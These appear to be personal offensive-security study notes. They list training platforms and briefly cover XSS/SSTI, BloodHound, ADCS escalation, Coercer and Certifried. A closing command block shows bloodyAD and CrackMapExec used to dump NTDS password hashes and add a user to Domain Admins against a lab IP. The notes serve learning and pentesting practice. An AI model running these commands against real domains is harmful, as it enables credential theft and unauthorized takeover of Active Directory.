
# Learning Resources for Cybersecurity

* TryHackMe
* HackTheBox
* Over The Wire
* https://taggartinstitute.org/
* PentesterLab  


## Random Notes

* When looking for XSS also look for SSTI or CSTI  


* As a blue teamer, you should run Blood Hound regularly and analyze its output.
* As a red teamer, your job is not to fix the vulnerabilities. Your job is to report
  the vulnerabilities to the client. It is their decision to make about how to reconfigure their
  environment.


### Escalation Paths (esc)
`ESC<number>` : escalation paths


### Coercer
[coercer.py](https://github.com/p0dalirius/Coercer)
A python script to automatically coerce a Windows server 
to authenticate on an arbitrary machine through many methods.


### Certifried: Active Directory Domain Privelege Escalation  
Actice Directory Certificate Services  
Present certificate to access to direcory  
It takes the cert and checks if it corresponds to an active directory object.  



### bloodyAD
```bash
bloodyAD -h 

bloodyAD -d 'domain.name' -u 'users.name' -p 'passwordgoeshere' \
--host 10.10.10.2 get children --target 'Domain Admins'

#when windows stores a password, it stores NTLM hashes, and they all will have the same LandMan hash NTDS hashes. LandMan hashes are not stored anymore. For legacy purposes they still have an entry in there. The second hash from cme smb will be the second hash separated by the colon. You can just use a colon and the NT hash ( :B0B4D2498249AO54UJ9D06E)
cme smb 10.10.10.2 -u 'users.name' -p 'seek' --ntds --user robert.almstead

bloodyAD -d "mydomain.local" -u 'users.name' -p 'passwordgoeshere' \
--host 10.10.10.2 get membership ''

bloodyAD -d "mydomain.local" -u 'users.name' -p 'passwordgoeshere' \
--host 10.10.10.2 add groupMember 'Domain Admins' 'robert.olmstead'

bloodyAD -d "mydomain.local" -u 'users.name' -p 'passwordgoeshere' \
--host 10.10.10.2 remove groupMember 'Domain Admins' 'users.name'
```




